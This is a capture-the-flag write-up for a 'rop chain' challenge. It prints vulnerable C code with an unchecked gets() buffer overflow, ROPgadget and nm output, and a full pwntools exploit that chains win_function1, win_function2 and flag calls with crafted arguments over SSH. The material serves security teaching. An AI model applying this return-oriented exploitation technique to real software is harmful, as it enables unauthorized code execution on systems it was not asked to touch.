rop chain - Points: 350
===========

## Description

>Can you exploit the following program and get the flag? 

## Hint:

> * Try and call the functions in the correct order!
> * Remember, you can always call main() again!


## Vulnerable Code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;


void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

## Useful Information

There is no check of the input length at :
> *  return gets(buf);

**TOOL** :[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)

```bash
$ROPgadget --binary rop-chain|grep " : pop ... ; ret"
...
0x0804840d : pop ebx ; ret

$nm rop-chain|grep win_ && nm rop-chain|grep flag
080485cb T win_function1
080485d8 T win_function2
0804862b T flag
```


## Exploit


> 1. Execute Win1()
> 2. Execute Win2() with good parameters
> 3. Execute Flag() with good parameters

**PAYLOAD : BUFFER+ADR_WIN1+ADR_WIN2+POP_1+ARG+ADR_FLAG+ADR_RET+ARG**

```python
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
from pwn import *


win_function1 = 0x80485cb
win_function2 = 0x80485d8
flag          = 0x804862b
pop_ret       = 0x0804840d

#To Complete
user=""
password=""
host=""

path_exec="/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9/rop"
Name_prog="rop-chain"

sh = ssh(host=host,user=user,password=password).run("sh")

#Read and print
adr=sh.recv().decode("utf-8")
print(adr)

pay="A"*28
pay+=p32(win_function1)
pay+=p32(win_function2)+p32(pop_ret)+p32(0xBAAAAAAD)
pay+=p32(flag)+"XXXX"+p32(0xDEADBAAD)


sh.sendline("cd "+"/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9")
sh.sendline("./rop")
sh.recv()
sh.sendline(pay)
sh.recv()
print(sh.recv())
sh.close()

```
